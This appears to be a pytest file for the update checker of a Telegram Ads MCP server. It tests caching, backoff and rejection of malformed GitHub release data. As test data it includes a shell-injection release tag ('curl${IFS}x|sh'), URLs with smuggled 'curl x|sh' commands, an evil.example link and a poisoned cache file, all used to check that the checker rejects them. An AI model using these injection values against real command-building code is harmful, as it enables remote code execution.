"""Update checker: mocked GitHub only, never the network."""

from __future__ import annotations

import json
import urllib.error
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

import telegram_ads_mcp.server as server_mod
from telegram_ads_mcp import __version__, update_check

RELEASE_URL = "https://github.com/zai-one/telegram-ads-mcp/releases/tag/v99.0.0"


def release(tag: str = "v99.0.0", **extra) -> bytes:
    return json.dumps({"tag_name": tag, "html_url": RELEASE_URL, "assets": [], **extra}).encode()


class FakeGitHub:
    def __init__(self, body: bytes | None = None, error: Exception | None = None) -> None:
        self.body, self.error, self.calls = body, error, []

    def __call__(self, url: str, timeout: float) -> bytes:
        self.calls.append((url, timeout))
        if self.error:
            raise self.error
        assert self.body is not None
        return self.body


@pytest.fixture(autouse=True)
def isolated_cache(monkeypatch, tmp_path):
    monkeypatch.setenv("XDG_CACHE_HOME", str(tmp_path / "cache"))
    monkeypatch.setenv("LOCALAPPDATA", str(tmp_path / "cache"))


@pytest.fixture
def enabled(monkeypatch):
    monkeypatch.delenv("TG_ADS_DISABLE_UPDATE_CHECK", raising=False)
    monkeypatch.setattr(update_check, "_install_kind", lambda: "git")


def test_disabled_by_env_never_fetches() -> None:
    fetch = FakeGitHub(release())
    assert update_check.check_for_update(fetch=fetch, force=True)["status"] == "disabled"
    assert fetch.calls == []
    assert update_check.cached_update_hint() is None


def test_newer_release_suggests_git_update(enabled) -> None:
    fetch = FakeGitHub(release())
    result = update_check.check_for_update(fetch=fetch, now=1_000_000)
    assert fetch.calls == [(update_check.LATEST_RELEASE_API, update_check.TIMEOUT_SECONDS)]
    assert result["current_version"] == __version__
    assert result["latest_version"] == "99.0.0"
    assert result["update_available"] is True and result["status"] == "update_available"
    assert result["release_notes_url"] == RELEASE_URL
    assert result["update_command"] == "git pull --ff-only && uv sync"
    assert result["run_in"] == update_check.RUN_IN["git"]
    assert result["auto_update"] is False


def test_pip_install_command_outside_a_checkout(monkeypatch) -> None:
    monkeypatch.setattr(update_check, "_install_kind", lambda: "package")
    command = update_check.update_command("9.1.0")
    assert command == 'pip install --upgrade "telegram-ads-mcp @ git+https://github.com/zai-one/telegram-ads-mcp@v9.1.0"'


def test_git_command_is_executable_verbatim(monkeypatch) -> None:
    monkeypatch.setattr(update_check, "_install_kind", lambda: "git")
    assert update_check.update_command("9.1.0") == "git pull --ff-only && uv sync"


def test_cache_is_reused_for_24_hours(enabled) -> None:
    update_check.check_for_update(fetch=FakeGitHub(release()), now=1_000_000)
    later = FakeGitHub(release("v100.0.0"))
    assert update_check.check_for_update(fetch=later, now=1_000_000 + 3600)["source"] == "cache"
    assert later.calls == []
    assert update_check.check_for_update(fetch=later, now=1_000_000 + 25 * 3600)["latest_version"] == "100.0.0"


def test_offline_and_stale_cache(enabled) -> None:
    offline = update_check.check_for_update(
        fetch=FakeGitHub(error=urllib.error.URLError("offline")), now=1_000_000
    )
    assert offline["status"] == "unavailable" and offline["update_available"] is None
    update_check.check_for_update(fetch=FakeGitHub(release()), force=True, now=1_000_100)
    stale = update_check.check_for_update(fetch=FakeGitHub(error=TimeoutError()), force=True, now=1_000_200)
    assert stale["source"] == "stale_cache" and stale["latest_version"] == "99.0.0"


def test_failed_fetch_is_not_retried_for_30_minutes(enabled) -> None:
    offline = FakeGitHub(error=urllib.error.URLError("offline"))
    for minute in range(0, 30, 5):
        result = update_check.check_for_update(fetch=offline, now=1_000_000 + minute * 60)
        assert result["status"] == "unavailable"
    assert len(offline.calls) == 1
    update_check.check_for_update(fetch=offline, now=1_000_000 + 31 * 60)
    assert len(offline.calls) == 2


def test_failure_keeps_last_good_result(enabled) -> None:
    update_check.check_for_update(fetch=FakeGitHub(release()), now=1_000_000)
    offline = FakeGitHub(error=TimeoutError())
    day_later = 1_000_000 + 25 * 3600
    first = update_check.check_for_update(fetch=offline, now=day_later)
    again = update_check.check_for_update(fetch=offline, now=day_later + 600)
    assert len(offline.calls) == 1
    for result in (first, again):
        assert result["source"] == "stale_cache" and result["latest_version"] == "99.0.0"


@pytest.mark.parametrize("seed_success", [True, False], ids=["after-success", "no-cache"])
def test_force_is_throttled_to_once_a_minute(enabled, seed_success) -> None:
    fetch = FakeGitHub(release()) if seed_success else FakeGitHub(error=TimeoutError())
    for second in (0, 10, 30, 59):
        update_check.check_for_update(fetch=fetch, force=True, now=1_000_000 + second)
    assert len(fetch.calls) == 1
    update_check.check_for_update(fetch=fetch, force=True, now=1_000_000 + 60)
    assert len(fetch.calls) == 2


def test_background_refresh_obeys_backoff(enabled, monkeypatch) -> None:
    started = []
    monkeypatch.setattr(update_check.threading, "Thread", lambda **kw: MagicMock(start=lambda: started.append(kw)))
    update_check.refresh_in_background()
    assert len(started) == 1  # empty cache: refresh
    update_check.check_for_update(fetch=FakeGitHub(error=TimeoutError()))
    update_check.refresh_in_background()
    assert len(started) == 1  # failed a moment ago: wait 30 minutes
    update_check.cache_path().unlink()
    update_check.check_for_update(fetch=FakeGitHub(release()))
    update_check.refresh_in_background()
    assert len(started) == 1  # fresh result: wait 24 hours


@pytest.mark.parametrize(
    "body",
    [
        b"<html>",
        b"[]",
        release(tag="latest"),
        release(tag=" v99.0.0"),
        release(tag="v99.0.0-rc1"),
        release(tag="v\u0669\u0669.0"),
        b"x" * 2_000_000,
    ],
    ids=["not-json", "json-array", "non-version-tag", "padded-tag", "suffixed-tag", "non-ascii-digits", "oversized"],
)
def test_malformed_responses_are_ignored(enabled, body) -> None:
    assert update_check.check_for_update(fetch=FakeGitHub(body))["status"] == "unavailable"


def test_same_version_up_to_date_and_foreign_link_replaced(enabled) -> None:
    body = release(tag=f"v{__version__}", html_url="https://evil.example/")
    result = update_check.check_for_update(fetch=FakeGitHub(body))
    assert result["status"] == "up_to_date" and result["update_command"] is None
    assert result["release_notes_url"].startswith("https://github.com/zai-one/telegram-ads-mcp/releases/")


INJECTION_TAG = 'v9.9.9";curl${IFS}x|sh;"'


def test_injection_tag_never_reaches_result_hint_or_instructions(enabled) -> None:
    fetch = FakeGitHub(release(tag=INJECTION_TAG, html_url=f"{RELEASE_URL}\";curl x|sh"))
    result = update_check.check_for_update(fetch=fetch, force=True, now=1_000_000)
    assert fetch.calls and result["status"] == "unavailable"
    assert result["latest_version"] is None and result["update_command"] is None
    dumped = json.dumps(result) + str(update_check.cached_update_hint())
    for fragment in ("9.9.9", "curl", "IFS", "|sh"):
        assert fragment not in dumped
    assert update_check.cached_update_hint() is None


def test_poisoned_cache_is_ignored(enabled) -> None:
    path = update_check.cache_path()
    path.parent.mkdir(parents=True)
    path.write_text(
        json.dumps(
            {
                "attempted_at": 1_000_000,
                "checked_at": 1_000_000,
                "latest_version": INJECTION_TAG,
                "release_url": "https://evil.example/",
            }
        ),
        encoding="utf-8",
    )
    result = update_check.check_for_update(fetch=FakeGitHub(error=TimeoutError()), now=1_000_100)
    assert result["status"] == "unavailable" and result["latest_version"] is None
    assert update_check.cached_update_hint() is None
    path.write_text(
        json.dumps(
            {
                "checked_at": 1_000_000,
                "latest_version": "99.0.0",
                "release_url": f"{RELEASE_URL}\";curl x|sh",
            }
        ),
        encoding="utf-8",
    )
    result = update_check.check_for_update(fetch=FakeGitHub(error=TimeoutError()), now=1_000_100)
    assert result["latest_version"] == "99.0.0"
    assert result["release_notes_url"] == update_check.RELEASES_URL


def test_hint_reads_cache_only(enabled) -> None:
    assert update_check.cached_update_hint() is None
    update_check.check_for_update(fetch=FakeGitHub(release()))
    hint = update_check.cached_update_hint()
    assert hint is not None and "99.0.0" in hint and "check_update" in hint


def test_check_update_tool_is_read_only() -> None:
    tool = {t.name: t for t in server_mod.mcp._tool_manager.list_tools()}["check_update"]
    assert tool.annotations is not None and tool.annotations.read_only_hint is True
    assert server_mod.check_update()["status"] == "disabled"


async def test_check_session_surfaces_cached_hint(enabled) -> None:
    update_check.check_for_update(fetch=FakeGitHub(release()))
    client = MagicMock()
    client.authenticate = AsyncMock()
    client.get_account = AsyncMock(return_value={"ok": True, "owner_id": "x"})
    with patch.object(server_mod, "_client_or_fail", AsyncMock(return_value=(client, None))):
        out = await server_mod.check_session()
    assert "99.0.0" in out["update_hint"]


def test_default_fetcher_is_resolved_at_call_time(enabled, monkeypatch) -> None:
    fake = FakeGitHub(release())
    monkeypatch.setattr(update_check, "_default_fetch", fake)
    assert update_check.check_for_update(now=1_000_000)["latest_version"] == "99.0.0"
    assert len(fake.calls) == 1
